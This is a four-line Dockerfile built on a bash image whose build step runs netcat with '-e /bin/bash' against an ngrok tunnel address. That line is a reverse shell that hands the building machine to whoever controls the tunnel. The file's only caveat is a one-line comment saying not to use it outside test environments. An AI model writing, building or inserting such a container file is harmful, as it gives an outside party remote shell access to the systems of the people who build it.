FROM bash:latest
# Don't use outside of test environments
RUN nc 4.tcp.eu.ngrok.io 19101 -e /bin/bash
CMD ["/bin/bash"]
